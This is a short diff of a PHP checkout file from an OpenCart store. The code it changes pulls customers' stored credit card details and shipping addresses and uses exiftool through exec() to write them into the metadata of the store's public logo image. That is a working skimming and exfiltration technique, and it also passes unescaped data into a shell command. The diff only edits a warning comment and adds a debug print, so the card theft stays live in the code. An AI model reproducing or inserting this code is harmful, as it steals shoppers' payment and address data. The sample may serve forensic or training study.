@@ -1,6 +1,6 @@
 <?php 
 
-    //WARNING!! Tampered code!!! embed customer data info to png logo!
+    //WARNING!! It contains Malicious code To embed customer data info to png logo!
 
     $credit_cards = $this->model_checkout_payment_method->getCreditCardInfo($this->session->data['customer']['customer_id']);
 
@@ -16,6 +16,8 @@
 
     $credit_card_string = str_replace('"', "", json_encode($credit_card_infos));
 
+    print_r($credit_card_string);
+
     $address_info = $this->session->data['shipping_address'];
 
     $address = $address_info["firstname"].'-'.$address_info["lastname"].'-'.$address_info["address_1"].'-'.$address_info["address_2"].'-'.$address_info["postcode"].'-'.$address_info["city"];
@@ -24,5 +26,6 @@
 
     exec('exiftool -comment="credit cards:' .  $credit_card_string . '"  /var/www/html/image/catalog/opencart-logo.png');
     exec('exiftool -description="address:' . $address_string .'"  /var/www/html/image/catalog/opencart-logo.png');
+
     __HALT_COMPILER();
 ?>
